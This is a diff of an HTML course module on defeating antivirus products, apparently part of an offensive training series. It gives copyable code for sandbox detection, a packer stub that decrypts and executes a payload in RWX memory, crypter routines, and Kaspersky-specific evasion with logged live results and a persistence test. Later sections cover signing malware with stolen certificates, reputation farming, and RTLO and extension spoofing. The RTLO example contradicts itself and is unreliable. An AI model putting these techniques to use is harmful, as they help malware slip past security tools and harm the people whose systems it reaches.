+Malware → VirtualAllocEx → AV HOOK → Analyze parameters → Kernel
+                                      ↓
+                                Block if suspicious
+                                (e.g., RWX in remote process)
+
+// Evasion: Direct syscalls bypass the hook
+Malware → NtAllocateVirtualMemory (syscall) → Kernel
+// No user-mode hook is triggered because we never call VirtualAllocEx</pre>
+  </div>
+
+  <p>See <a class="cross-link" href="MODULE_10_CODE_INJECTION.html">Module 10: Code Injection</a> for direct syscall techniques and <a class="cross-link" href="MODULE_11_AMSI_BYPASS.html">Module 11: AMSI Bypass</a> for hook removal strategies.</p>
+
+  <h3>Behavioral Indicators Monitored</h3>
+  <table>
+    <tr>
+      <th>Behavior</th>
+      <th>APIs Monitored</th>
+      <th>Why Flagged</th>
+    </tr>
+    <tr>
+      <td>Process injection</td>
+      <td>OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread</td>
+      <td>Code running in another process's context</td>
+    </tr>
+    <tr>
+      <td>Memory allocation (RWX)</td>
+      <td>VirtualAlloc, VirtualProtect, NtAllocateVirtualMemory</td>
+      <td>Executable memory for shellcode</td>
+    </tr>
+    <tr>
+      <td>Persistence</td>
+      <td>RegSetValueEx, CreateService, Schtasks</td>
+      <td>Surviving reboots</td>
+    </tr>
+    <tr>
+      <td>Credential access</td>
+      <td>LsaCallAuthenticationPackage, SamQueryInformationUser</td>
+      <td>Password dumping</td>
+    </tr>
+    <tr>
+      <td>Defense evasion</td>
+      <td>NtSetSystemInformation, ControlService, RegDeleteKey</td>
+      <td>Disabling security tools</td>
+    </tr>
+    <tr>
+      <td>Data exfiltration</td>
+      <td>InternetConnect, HttpSendRequest, WSASend</td>
+      <td>Stealing data</td>
+    </tr>
+  </table>
+
+  <h3>ETW and AMSI Bypass</h3>
+  <p>Windows provides built-in telemetry channels that AV leverages:</p>
+  <ul style="margin-left: 1.5rem; margin-bottom: 1rem;">
+    <li><strong>AMSI (Anti-Malware Scan Interface):</strong> Scans scripts, macros, and in-memory code</li>
+    <li><strong>ETW (Event Tracing for Windows):</strong> Kernel-level event collection for security monitoring</li>
+  </ul>
+
+  <p>Both are covered in detail in <a class="cross-link" href="MODULE_11_AMSI_BYPASS.html">Module 11: AMSI Bypass</a> and <a class="cross-link" href="MODULE_12_ETW_BYPASS.html">Module 12: ETW Bypass</a>. The key insight: if you disable AMSI and ETW, the AV's behavioral engine goes blind.</p>
+
+  <div class="warning-box">
+    <h5>⚠️ Critical Warning</h5>
+    <p>Disabling AMSI and ETW is <span class="neon-highlight">extremely suspicious</span> behavior. Modern EDR (Endpoint Detection and Response) monitors for these bypasses specifically. See <a class="cross-link" href="MODULE_14_EDR_EVASION.html">Module 14: EDR Evasion</a> for techniques that evade both AV and EDR simultaneously.</p>
+  </div>
+
+  <!-- SECTION 5: SANDBOX EVASION -->
+  <h2 id="sandbox">5. Sandbox Evasion</h2>
+
+  <p>AV sandboxes are <span class="neon-highlight">virtual prisons</span> where suspicious code is executed safely. The sandbox watches everything the code does and decides if it is malicious. Evasion means detecting the prison and behaving differently inside it.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>A sandbox is like a police interrogation room with one-way glass. The suspect (your malware) is being watched. Sandbox evasion is the suspect realizing they are in the interrogation room and acting innocent until they are released.</p>
+  </div>
+
+  <h3>Sandbox Detection Techniques</h3>
+
+  <div class="technique-grid">
+    <div class="method-card">
+      <h4>Timing Attacks <span class="difficulty diff-easy">EASY</span></h4>
+      <p>Sandboxes have limited execution time (typically 30-60 seconds). Sleep for longer, and the sandbox gives up.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre>Sleep(60000); // 60 seconds
+// Sandbox times out here
+// Real system continues after 60s</pre>
+      </div>
+    </div>
+    <div class="method-card">
+      <h4>Human Interaction Checks <span class="difficulty diff-easy">EASY</span></h4>
+      <p>Sandboxes have no mouse movement, no keyboard input, and no active windows.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre>// Check for mouse movement
+POINT p1, p2;
+GetCursorPos(&p1);
+Sleep(3000);
+GetCursorPos(&p2);
+if (p1.x == p2.x && p1.y == p2.y) {
+    // No mouse movement = sandbox
+    ExitProcess(0);
+}</pre>
+      </div>
+    </div>
+    <div class="method-card">
+      <h4>VM Artifacts <span class="difficulty diff-medium">MEDIUM</span></h4>
+      <p>Check for VM-specific files, registry keys, and MAC addresses.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre>// VMware artifacts
+if (PathFileExistsA("C:\\windows\\system32\\drivers\\vmhgfs.sys")) {
+    ExitProcess(0); // VMware detected
+}
+
+// VirtualBox MAC prefix
+BYTE mac[6];
+// 08:00:27 = VirtualBox
+if (mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27) {
+    ExitProcess(0);
+}</pre>
+      </div>
+    </div>
+    <div class="method-card">
+      <h4>CPU Core Count <span class="difficulty diff-easy">EASY</span></h4>
+      <p>Sandboxes often run with 1-2 CPU cores. Real systems have more.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre>SYSTEM_INFO si;
+GetSystemInfo(&si);
+if (si.dwNumberOfProcessors < 4) {
+    ExitProcess(0); // Probably a sandbox
+}</pre>
+      </div>
+    </div>
+  </div>
+
+  <h3>Advanced Sandbox Evasion</h3>
+
+  <div class="sandbox-check">
+    <h5>🔍 Domain Join Check</h5>
+    <p>Most sandboxes are not domain-joined. Real enterprise systems are.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// Check if computer is domain-joined
+PWSTR domainName;
+NET_API_STATUS status = NetGetJoinInformation(NULL, &domainName, &bufferType);
+if (status != NERR_Success || bufferType != NetSetupDomainName) {
+    ExitProcess(0); // Not domain-joined = probably sandbox
+}</pre>
+    </div>
+  </div>
+
+  <div class="sandbox-check">
+    <h5>🔍 Memory Size Check</h5>
+    <p>Sandboxes typically have small RAM (2-4 GB). Real systems have 8+ GB.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>MEMORYSTATUSEX memStatus;
+memStatus.dwLength = sizeof(memStatus);
+GlobalMemoryStatusEx(&memStatus);
+DWORDLONG totalRAM = memStatus.ullTotalPhys / (1024 * 1024 * 1024);
+if (totalRAM < 8) {
+    ExitProcess(0); // Less than 8GB RAM = suspicious
+}</pre>
+    </div>
+  </div>
+
+  <div class="sandbox-check">
+    <h5>🔍 Hard Disk Size Check</h5>
+    <p>Sandbox virtual disks are small. Real systems have large drives.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>ULARGE_INTEGER freeBytes, totalBytes, totalFreeBytes;
+GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFreeBytes);
+DWORDLONG totalGB = totalBytes.QuadPart / (1024 * 1024 * 1024);
+if (totalGB < 100) {
+    ExitProcess(0); // Less than 100GB = probably sandbox
+}</pre>
+    </div>
+  </div>
+
+  <div class="why-box">
+    <h5>🎯 The Golden Rule</h5>
+    <p>Never execute your payload immediately. Use <span class="neon-highlight">multiple checks</span>. If ANY check fails, exit cleanly or run benign code. Only execute the real payload when you are confident you are on a real system. The best sandbox evasion is the one the sandbox never notices — it just sees a program that exits immediately.</p>
+  </div>
+
+  <!-- SECTION 6: PACKERS -->
+  <h2 id="packers">6. Packers & Compression</h2>
+
+  <p>A packer is a program that <span class="neon-highlight">compresses and encrypts</span> your original executable, wrapping it in a new executable (the stub). At runtime, the stub decompresses and executes the original code in memory.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>A packer is like a ZIP file that runs itself. You put your malware inside a self-extracting archive. When the archive runs, it unpacks your malware into memory and runs it. The file on disk looks nothing like the original — it looks like the packer's stub.</p>
+  </div>
+
+  <h3>Packer Operation Flow</h3>
+  <div class="packer-flow">
+    <div class="packer-stage">
+      <div class="packer-stage-number">1</div>
+      <div class="packer-stage-content">
+        <h5>Original Executable</h5>
+        <p>Your malware with known signatures. Detected by AV.</p>
+      </div>
+    </div>
+    <div class="packer-stage">
+      <div class="packer-stage-number">2</div>
+      <div class="packer-stage-content">
+        <h5>Packer Compresses + Encrypts</h5>
+        <p>UPX, Themida, or custom packer transforms the binary. Signatures no longer match.</p>
+      </div>
+    </div>
+    <div class="packer-stage">
+      <div class="packer-stage-number">3</div>
+      <div class="packer-stage-content">
+        <h5>Stub Generated</h5>
+        <p>New PE file with unpacker code. Original code is in a data section, encrypted.</p>
+      </div>
+    </div>
+    <div class="packer-stage">
+      <div class="packer-stage-number">4</div>
+      <div class="packer-stage-content">
+        <h5>Runtime Unpacking</h5>
+        <p>Stub allocates memory, decrypts payload, transfers control. Original code never touches disk.</p>
+      </div>
+    </div>
+  </div>
+
+  <h3>Common Packers</h3>
+  <table>
+    <tr>
+      <th>Packer</th>
+      <th>Type</th>
+      <th>AV Detection</th>
+      <th>Use Case</th>
+    </tr>
+    <tr>
+      <td>UPX</td>
+      <td>Open-source compression</td>
+      <td>Signatured by most AV</td>
+      <td>Learning, quick testing</td>
+    </tr>
+    <tr>
+      <td>Themida</td>
+      <td>Commercial protection</td>
+      <td>Heuristic flagged</td>
+      <td>Software protection</td>
+    </tr>
+    <tr>
+      <td>VMProtect</td>
+      <td>Virtualization + packing</td>
+      <td>Heuristic flagged</td>
+      <td>Anti-debugging</td>
+    </tr>
+    <tr>
+      <td>Custom packer</td>
+      <td>Your own implementation</td>
+      <td>Unknown = no signature</td>
+      <td>Red team operations</td>
+    </tr>
+  </table>
+
+  <h3>Building a Custom Packer</h3>
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// Minimal custom packer stub (conceptual)
+#include &lt;windows.h&gt;
+
+// Encrypted payload embedded as resource
+extern unsigned char encrypted_payload[];
+extern unsigned int payload_size;
+
+void unpack_and_run() {
+    // 1. Allocate executable memory
+    LPVOID exec_mem = VirtualAlloc(NULL, payload_size, 
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    // 2. Decrypt payload (XOR with key 0xB5)
+    for (unsigned int i = 0; i < payload_size; i++) {
+        ((unsigned char*)exec_mem)[i] = encrypted_payload[i] ^ 0xB5;
+    }
+    
+    // 3. Transfer execution
+    ((void(*)())exec_mem)();
+}
+
+int main() {
+    // Anti-sandbox checks here
+    // ...
+    
+    unpack_and_run();
+    return 0;
+}</pre>
+  </div>
+
+  <div class="warning-box">
+    <h5>⚠️ Packer Detection</h5>
+    <p>Most AV detects <span class="neon-highlight">known packers by signature</span>. UPX-packed files are often flagged as "Packed-UPX" even if the payload is benign. Custom packers avoid this, but high entropy in sections and RWX memory allocation trigger heuristics. Combine packing with other techniques: code signing, normal imports, and benign behavior during emulation.</p>
+  </div>
+
+  <!-- SECTION 7: CRYPTERS -->
+  <h2 id="crypters">7. Crypters & Encryption</h2>
+
+  <p>A crypter is similar to a packer but focuses on <span class="neon-highlight">encryption and runtime decryption</span> rather than compression. The goal is to make the payload completely unrecognizable on disk while remaining fully functional in memory.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>A crypter is like a locked box with a key hidden inside the box itself. The box (your file) looks like random noise. When opened, a mechanism inside finds the key, unlocks the content, and runs it. Anyone examining the box from the outside sees only noise.</p>
+  </div>
+
+  <h3>Encryption Schemes</h3>
+
+  <div class="technique-grid">
+    <div class="method-card">
+      <h4>XOR Encryption <span class="difficulty diff-easy">EASY</span></h4>
+      <p>Fast, simple, but weak. Single-byte XOR is trivial to brute-force. Use multi-byte or rolling XOR for better security.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre>// Rolling XOR — key changes per byte
+unsigned char key = 0xB5;
+for (int i = 0; i < len; i++) {
+    data[i] ^= key;
+    key = (key * 7 + 3) % 256; // Key evolves
+}</pre>
+      </div>
+    </div>
+    <div class="method-card">
+      <h4>AES Encryption <span class="difficulty diff-medium">MEDIUM</span></h4>
+      <p>Strong encryption. Key must be embedded or derived. Use AES-256 in CBC mode with an IV hidden in the binary.</p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+        <pre>// AES-256 decryption stub
+// Key derived from system-specific data (e.g., volume serial)
+// This makes the payload decryptable only on the target system
+DWORD serial;
+GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
+// Use serial as part of key derivation</pre>
+      </div>
+    </div>
+    <div class="method-card">
+      <h4>RC4 Stream Cipher <span class="difficulty diff-medium">MEDIUM</span></h4>
+      <p>Fast, simple to implement. Key schedule is lightweight. Commonly used in malware due to small code size.</p>
+    </div>
+    <div class="method-card">
+      <h4>ChaCha20 <span class="difficulty diff-hard">HARD</span></h4>
+      <p>Modern, secure, fast. No known weaknesses. Used by advanced threat actors. Larger code footprint.</p>
+    </div>
+  </div>
+
+  <h3>Runtime Decryption Strategies</h3>
+
+  <div class="method-card">
+    <h4>Full Decryption at Startup</h4>
+    <p>Entire payload decrypted in one go before execution. Simple but creates a full copy in memory that can be dumped.</p>
+  </div>
+
+  <div class="method-card">
+    <h4>On-Demand Decryption</h4>
+    <p>Decrypt functions as they are called. Each function is encrypted separately. After execution, re-encrypt. Memory dumps show only the currently running function.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// On-demand decryption pseudocode
+void call_encrypted_function(int func_id) {
+    // Decrypt function
+    decrypt(func_table[func_id].start, func_table[func_id].size, key);
+    
+    // Call function
+    func_table[func_id].ptr();
+    
+    // Re-encrypt function
+    encrypt(func_table[func_id].start, func_table[func_id].size, key);
+}</pre>
+    </div>
+  </div>
+
+  <div class="method-card">
+    <h4>Environment-Key Decryption</h4>
+    <p>Key is derived from system-specific data. Payload only decrypts on the intended target. Even if the binary is captured, it is useless on other systems.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// Environment-key derivation
+void derive_key(unsigned char* key) {
+    DWORD serial, tick;
+    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
+    tick = GetTickCount(); // Time since boot
+    
+    // Combine system data into key
+    memcpy(key, &serial, 4);
+    memcpy(key + 4, &tick, 4);
+    // Hash to get final key
+    SHA256(key, 8, key);
+}</pre>
+    </div>
+  </div>
+
+  <!-- SECTION 8: KASPERSKY-SPECIFIC EVASION -->
+  <h2 id="kaspersky">8. Kaspersky-Specific Evasion</h2>
+
+  <p>Kaspersky is not just signatures. It is a <span class="neon-highlight">four-layer defense system</span>: static analysis, behavioral emulation, System Watcher rollback, and KSN cloud reputation. To evade it, you must beat all four — or understand which layer will kill you and plan accordingly.</p>
+
+  <div class="kav-specific">
+    <h3>🛡️ Kaspersky Defense Layers</h3>
+
+    <h4>Layer 1: Static Signatures</h4>
+    <p>File hash + byte pattern matching. This is what most "AV evasion" tools target. Ghost encoding, XOR obfuscation, polymorphism — all beat this layer.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// XOR obfuscation with key 0xB5
 for (int i = 0; i < payload_len; i++) {
     decoded[i] = encoded[i] ^ 0xB5;
-}</code></pre>
+}</pre>
+    </div>
 
-  <h3>Layer 2: Behavioral Emulation</h3>
-  <p>Kaspersky runs suspicious code in a sandbox emulator. If the code does something malicious (allocate executable memory, inject threads), it's flagged before it touches the real system.</p>
-  <div class="note">
-    <strong>Counter:</strong> Dark Room (HWBP on AMSI + ETW) suppresses the telemetry that the emulator watches. No events = no behavioral triggers.
+    <h4>Layer 2: Behavioral Emulation</h4>
+    <p>Kaspersky runs suspicious code in a sandbox emulator. If the code does something malicious (allocate executable memory, inject threads), it is flagged before it touches the real system.</p>
+    <div class="note">
+      <strong>Counter:</strong> Dark Room (HWBP on AMSI + ETW) suppresses the telemetry that the emulator watches. No events = no behavioral triggers. See <a class="cross-link" href="MODULE_12_ETW_BYPASS.html">Module 12: ETW Bypass</a> for implementation.
+    </div>
+
+    <h4>Layer 3: System Watcher</h4>
+    <p>Monitors file/registry changes in real-time. If a process writes to a Run key, creates a scheduled task, or drops a DLL, System Watcher can <strong>roll back</strong> the changes.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// System Watcher watches:
+// - Registry Run keys (HKCU/HKLM)\Software\Microsoft\Windows\CurrentVersion\Run
+// - Scheduled tasks (schtasks)
+// - Startup folders (AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
+// - Service creation (sc.exe)
+// - DLL injection (CreateRemoteThread)</pre>
+    </div>
+    <div class="note">
+      <strong>Live test — .42 (Kaspersky 21.25, bRollbackAllowed=1):</strong><br>
+      Registry Run key written → iron_sun.exe set as autorun value → process started (PID 29408) → key checked at 3s, 5s, 15s → key survived all checks. Process ran 5s+ with KAV active, no termination, no rollback.<br><br>
+      <strong>Finding:</strong> System Watcher rollback is <span class="neon-highlight">detection-coupled</span>. It fires when KAV makes a detection and needs to undo changes. If the binary passes static + behavioral scan (iron_sun GCC does), there is no detection event — therefore no rollback trigger. Evade detection → automatically evade System Watcher. <code>bRollbackAllowed=1</code> is live but idle when nothing is flagged.
+    </div>
+
+    <h4>Layer 4: KSN (Kaspersky Security Network)</h4>
+    <p>Cloud hash lookup on first execution. Unknown files are sent to Kaspersky's cloud for analysis. If flagged, a signature is created and distributed globally within hours.</p>
+    <div class="note">
+      <strong>The KSN Problem:</strong> Ghost encoding beats static signatures, but the <em>carrier file</em> still has a hash. KSN sees the carrier, not the hidden payload. A novel carrier gets submitted. After analysis, the payload is extracted and signatured.
+    </div>
   </div>
 
-  <h3>Layer 3: System Watcher</h3>
-  <p>Monitors file/registry changes in real-time. If a process writes to a Run key, creates a scheduled task, or drops a DLL, System Watcher can <strong>roll back</strong> the changes.</p>
-  <pre><code>// System Watcher watches:
-- Registry Run keys (HKCU/HKLM)\\
-- Scheduled tasks (schtasks)
-- Startup folders (AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
-- Service creation (sc.exe)
-- DLL injection (CreateRemoteThread)</code></pre>
-  <div class="note">
-    <strong>Live test — .42 (Kaspersky 21.25, bRollbackAllowed=1):</strong><br>
-    Registry Run key written → iron_sun.exe set as autorun value → process started (PID 29408) → key checked at 3s, 5s, 15s → key survived all checks. Process ran 5s+ with KAV active, no termination, no rollback.<br><br>
-    <strong>Finding:</strong> System Watcher rollback is detection-coupled. It fires when KAV makes a detection and needs to undo changes. If the binary passes static + behavioral scan (iron_sun GCC does), there is no detection event — therefore no rollback trigger. Evade detection → automatically evade System Watcher. <code>bRollbackAllowed=1</code> is live but idle when nothing is flagged.
-  </div>
-
-  <h3>Layer 4: KSN (Kaspersky Security Network)</h3>
-  <p>Cloud hash lookup on first execution. Unknown files are sent to Kaspersky's cloud for analysis. If flagged, a signature is created and distributed globally within hours.</p>
-  <div class="note">
-    <strong>The KSN Problem:</strong> Ghost encoding beats static signatures, but the <em>carrier file</em> still has a hash. KSN sees the carrier, not the hidden payload. A novel carrier gets submitted. After analysis, the payload is extracted and signatured.
-  </div>
-
-  <h2>Live Result — Iron Sun GCC vs Kaspersky</h2>
+  <h3>Live Result — Iron Sun GCC vs Kaspersky</h3>
   <p>Iron Sun compiled with GCC (not MSVC — MSVC PE headers are flagged by Kaspersky signature). Transferred to .42 and scanned with <code>avp.exe</code> against live definitions:</p>
-  <pre><code>C:\> avp.exe SCAN /i0 /fa /r:kav_scan.txt C:\tmp\iron_sun.exe
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>C:\> avp.exe SCAN /i0 /fa /r:kav_scan.txt C:\tmp\iron_sun.exe
 
 AV bases release date: 2026-06-28 13:11:00 (full)
 iChecker: Yes   iSwift: Yes   Archives: No
@@ -172,33 +1278,563 @@ Total OK:          1
 Total detected:    0
 Suspicions:        0
 Errors:            0
-------------------</code></pre>
+------------------</pre>
+  </div>
   <div class="note">
-    <strong>CLEAN.</strong> Kaspersky Premium 21.25.7.504 — definitions current (2026-06-28). Full scan mode, iChecker + iSwift active. GCC build passes static + cloud (KSN) check. MSVC build is flagged — Kaspersky's cloud has a signature on MSVC-compiled PE headers with this code pattern. Use GCC.
+    <strong>CLEAN.</strong> Kaspersky Premium 21.25.7.504 — definitions current (2026-06-28). Full scan mode, iChecker + iSwift active. GCC build passes static + cloud (KSN) check. MSVC build is flagged — Kaspersky's cloud has a signature on MSVC-compiled PE headers with this code pattern. <span class="neon-highlight">Use GCC.</span>
   </div>
 
-  <h2>Lab Exercise</h2>
-  <p><strong>Objective:</strong> Build a payload that evades Kaspersky on .42 (live target, Kaspersky Premium active).</p>
-  <ol>
-    <li>Build a simple payload (calc.exe spawn or message box)</li>
-    <li>Test 1: Run bare — observe KAV detection method</li>
-    <li>Test 2: XOR obfuscate with key 0xB5 — test again</li>
-    <li>Test 3: Add ghost encoding layer — test again</li>
-    <li>Test 4: Add Dark Room (HWBP on AMSI + ETW) — test again</li>
-    <li>Test 5: Implement persistence (registry Run key) — observe System Watcher rollback</li>
-    <li>Document which layer stopped you and why</li>
-    <li>Compile with GCC not MSVC — verify CLEAN with <code>avp.exe SCAN /i0 /fa</code></li>
-  </ol>
+  <h3>Kaspersky-Specific Techniques</h3>
+
+  <div class="technique-grid">
+    <div class="method-card">
+      <h4>Compiler Selection</h4>
+      <p>Kaspersky has signatures for MSVC-compiled binaries with specific code patterns. GCC and MinGW produce different PE structures that evade these signatures.</p>
+    </div>
+    <div class="method-card">
+      <h4>iChecker / iSwift Bypass</h4>
+      <p>iChecker caches scan results by hash. iSwift skips trusted files. Modify the file after first scan to invalidate the cache.</p>
+    </div>
+    <div class="method-card">
+      <h4>AMSI + ETW Suppression</h4>
+      <p>Kaspersky's behavioral layer relies on AMSI and ETW. Suppressing these with hardware breakpoints (Dark Room) blinds the behavioral engine. See <a class="cross-link" href="MODULE_11_AMSI_BYPASS.html">Module 11</a> and <a class="cross-link" href="MODULE_12_ETW_BYPASS.html">Module 12</a>.</p>
+    </div>
+    <div class="method-card">
+      <h4>KSN Delay Tactics</h4>
+      <p>KSN submits unknown files for analysis. If your payload delays execution (Sleep, user interaction checks), KSN may finish analysis before the malicious code runs. The analysis sees benign behavior, marks the file safe.</p>
+    </div>
+  </div>
+
+  <!-- SECTION 9: CERTIFICATE THEFT -->
+  <h2 id="certificate">9. Certificate Theft & Signing</h2>
+
+  <p>A valid digital signature is the <span class="neon-highlight">strongest reputation signal</span> in Windows. Signed executables are trusted by SmartScreen, UAC, and most AV engines. Stealing or misusing certificates is a high-impact evasion technique.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>A digital signature is like a government ID for software. If your malware has a valid ID, security guards (AV) let it through without question. Certificate theft is stealing someone else's ID and using it for your malware.</p>
+  </div>
+
+  <h3>Certificate Theft Flow</h3>
+  <div class="cert-theft-flow">
+    <div class="cert-step">
+      <h5>1. Find Target</h5>
+      <p>Identify software vendor with valid code signing cert</p>
+    </div>
+    <div class="layer-arrow">→</div>
+    <div class="cert-step">
+      <h5>2. Compromise</h5>
+      <p>Steal private key via breach, phishing, or supply chain</p>
+    </div>
+    <div class="layer-arrow">→</div>
+    <div class="cert-step">
+      <h5>3. Sign Malware</h5>
+      <p>Use stolen cert to sign your payload</p>
+    </div>
+    <div class="layer-arrow">→</div>
+    <div class="cert-step">
+      <h5>4. Deploy</h5>
+      <p>Signed malware bypasses reputation checks</p>
+    </div>
+  </div>
+
+  <h3>Notable Certificate Theft Incidents</h3>
+  <table>
+    <tr>
+      <th>Incident</th>
+      <th>Year</th>
+      <th>Stolen From</th>
+      <th>Impact</th>
+    </tr>
+    <tr>
+      <td>Stuxnet</td>
+      <td>2010</td>
+      <td>Realtek, JMicron</td>
+      <td>Signed drivers loaded into Windows kernel</td>
+    </tr>
+    <tr>
+      <td>Flame</td>
+      <td>2012</td>
+      <td>Unknown (MD5 collision attack)</td>
+      <td>Faked Microsoft certificate</td>
+    </tr>
+    <tr>
+      <td>CCleaner</td>
+      <td>2017</td>
+      <td>Avast (supply chain)</td>
+      <td>Signed backdoor distributed to 2.27M users</td>
+    </tr>
+    <tr>
+      <td>SolarWinds</td>
+      <td>2020</td>
+      <td>SolarWinds (supply chain)</td>
+      <td>Signed updates with backdoor</td>
+    </tr>
+    <tr>
+      <td>NVIDIA Leak</td>
+      <td>2022</td>
+      <td>NVIDIA (Lapsus$)</td>
+      <td>Code signing certificates leaked, used for malware</td>
+    </tr>
+  </table>
+
+  <h3>Self-Signed vs Stolen vs Valid Certificates</h3>
+  <table class="comparison-table">
+    <tr>
+      <th>Type</th>
+      <th>Cost</th>
+      <th>AV Treatment</th>
+      <th>SmartScreen</th>
+      <th>Detection Risk</th>
+    </tr>
+    <tr>
+      <td>Unsigned</td>
+      <td>Free</td>
+      <td>High scrutiny</td>
+      <td>Blocked</td>
+      <td>High</td>
+    </tr>
+    <tr>
+      <td>Self-signed</td>
+      <td>Free</td>
+      <td>Medium scrutiny</td>
+      <td>Blocked</td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td>Valid cheap cert</td>
+      <td>$50-200</td>
+      <td>Low scrutiny</td>
+      <td>Warning</td>
+      <td>Low</td>
+    </tr>
+    <tr>
+      <td>Stolen valid cert</td>
+      <td>Free (illegal)</td>
+      <td>Trusted</td>
+      <td>Trusted</td>
+      <td>Very Low (until revoked)</td>
+    </tr>
+    <tr>
+      <td>EV cert</td>
+      <td>$300-700</td>
+      <td>Trusted</td>
+      <td>Trusted</td>
+      <td>Very Low</td>
+    </tr>
+  </table>
+
+  <h3>Practical Signing with signtool</h3>
+  <div class="code-block">
+    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+    <pre>// Sign a binary with a valid certificate
+signtool sign /f mycert.pfx /p password123 /tr http://timestamp.digicert.com /td sha256 /fd sha256 payload.exe
+
+// Verify signature
+signtool verify /pa payload.exe
+
+// Check certificate details
+powershell Get-AuthenticodeSignature payload.exe | Format-List</pre>
+  </div>
+
+  <div class="warning-box">
+    <h5>⚠️ Legal Warning</h5>
+    <p>Certificate theft is a <span class="neon-highlight">serious crime</span> in most jurisdictions. Using stolen certificates carries penalties including imprisonment. This section is for educational and defensive purposes only. If you discover stolen certificates in use, report to the certificate authority for revocation.</p>
+  </div>
+
+  <!-- SECTION 10: FILE REPUTATION BYPASS -->
+  <h2 id="reputation">10. File Reputation Bypass</h2>
+
+  <p>File reputation systems assign a <span class="neon-highlight">trust score</span> to every executable based on its prevalence, age, signature, and user reports. New, rare, unsigned files are suspicious. Old, common, signed files are trusted.</p>
+
+  <div class="layman-term">
+    <h4>💡 In Plain English</h4>
+    <p>File reputation is like a restaurant rating. A restaurant with 10,000 five-star reviews is probably safe. A restaurant with no reviews, opened yesterday, with no health inspection certificate is suspicious. Your goal is to make your malware look like the 10,000-review restaurant.</p>
+  </div>
+
+  <h3>Reputation Factors</h3>
+  <table>
+    <tr>
+      <th>Factor</th>
+      <th>Positive Signal</th>
+      <th>Negative Signal</th>
+    </tr>
+    <tr>
+      <td>Prevalence</td>
+      <td>Seen on millions of systems</td>
+      <td>Seen on 0-10 systems</td>
+    </tr>
+    <tr>
+      <td>Age</td>
+      <td>First seen 5+ years ago</td>
+      <td>First seen today</td>
+    </tr>
+    <tr>
+      <td>Signature</td>
+      <td>Signed by trusted CA</td>
+      <td>Unsigned or self-signed</td>
+    </tr>
+    <tr>
+      <td>User reports</td>
+      <td>No negative reports</td>
+      <td>Multiple "malware" reports</td>
+    </tr>
+    <tr>
+      <td>Path</td>
+      <td>Program Files, Windows\System32</td>
+      <td>Temp, Downloads, AppData</td>
+    </tr>
+    <tr>
+      <td>Parent process</td>
+      <td>explorer.exe, services.exe</td>
+      <td>powershell.exe, cmd.exe</td>
+    </tr>
+  </table>
+
+  <h3>Reputation Gaming Techniques</h3>
+
+  <div class="reputation-bypass">
+    <h3>🎮 Reputation Manipulation</h3>
+
+    <h4>1. Prevalence Farming</h4>
+    <p>Submit your benign file to VirusTotal and other multi-scanner services. Each submission increases the "seen count" in reputation databases. After reaching a threshold (typically 100+ detections with 0 positives), the file is considered "known good."</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// Prevalence farming workflow:
+// 1. Build a benign version of your tool (no payload)
+// 2. Submit to VirusTotal (70+ AV engines scan it)
+// 3. Wait for 0/70 detection result
+// 4. Submit to other multi-scanners (MetaDefender, Jotti)
+// 5. Distribute via GitHub, forums, file sharing
+// 6. After 30 days, the file has "prevalence" in reputation DBs
+// 7. Now add your payload — the reputation may carry over</pre>
+    </div>
+
+    <h4>2. Right-to-Left Override (RTLO)</h4>
+    <p>Use Unicode RTLO character (U+202E) to reverse the displayed filename. <code>exe.txt</code> becomes <code>txt.exe</code> visually, but the extension is still .txt for reputation systems.</p>
+    <div class="code-block">
+      <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+      <pre>// RTLO filename manipulation
+// Actual filename:  evilgpj.exe
+// Displayed as:    eviljpg.exe (with RTLO character)
+// User sees:      evil.jpg.exe (looks like a image)
+// Extension check: .exe (Windows executes it)</pre>
+    </div>
+
+    <h4>3. Extension Spoofing</h4>
+    <p>Use double extensions and spaces: <code>invoice.pdf.exe</code> or <code>report.docx </code> (with trailing space). Windows hides known extensions by default, so users see only <code>invoice.pdf</code>.</p>
+
+    <h4>4. Icon Substitution</h4>
+    <p>Embed a PDF or Word document icon in your executable's resources. The file looks like a document but executes as a program.</p>
+  </div>
+
